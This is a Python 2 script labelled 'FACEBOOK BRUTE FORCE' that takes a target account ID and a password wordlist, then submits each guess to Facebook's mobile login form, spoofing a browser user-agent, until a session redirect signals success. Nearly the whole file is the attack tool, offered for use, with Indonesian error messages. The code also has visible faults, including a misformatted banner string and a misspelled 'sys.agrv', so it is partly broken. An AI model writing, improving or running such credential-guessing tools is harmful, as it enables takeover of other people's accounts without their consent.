# encoding utf=8
# open source
import os
import sys
import mechanize
import cookielib,random,time
################
# color
################
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
################
pareasi ="""
[ FACEBOOK BRUTE FORCE ]
[ Coded By VRX ]
[ Version BETA ]
"""%(B,W)
def start():
	hek = sys.executable
	os.execl(hek, hek, * sys.agrv)
	syang = os.getcwd()
	
os.system('clear')
print "please wait..."
time.sleep(4)
def type(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(random.random() * 0.2)
type("""Start...%s """%(W))
os.system('clear')
print pareasi
print" "
try:
	id=sys.argv[1]
	passw=sys.argv[2]
except:
	print "%s[%sWARNING%s] %sKESALAHAN PENULISAN"%(G,R,G,W)
	print "*$ python2 bforce.py <id> <pass.txt>"
	sys.exit()
try:
	wordlist=open(passw,"r+")
except:
	print "%s[ %sWARNING %s] %sKESALAHAN PENULISAN"%(G,R,G,W)
	print "*$ python2 bforce.py <id> <pass.txt>"
	
url = "https://free.facebook.com"
print "%s[%sNOTE%s]%s Please Wait..."%(G,R,G,W)
print "[*] Start..."
to=1
cjar = cookielib.LWPCookieJar()
for pasw in wordlist.readlines():
		pasw = pasw.strip("\n")
		print "[#] attempt => %i"%(to)
		mech=mechanize.Browser()
		mech.set_handle_robots(False)
		mech.set_handle_redirect(True)
		mech.set_handle_referer(True)
		mech.set_handle_equiv(True)
		mech.set_cookiejar(cjar)
		mech.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		mech.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
		mech.open(url)
		mech.select_form(nr=0)
		mech.form["email"]=id
		mech.form["pass"]=pasw
		mech.submit()
		text=mech.geturl()
		to += 1
		if "save-device" in text or  "m_sess" in text:
			print "%s Success => %s"%(G,pasw)
			sys.exit()
		else:
			print "%s Failed => %s"%(R,pasw)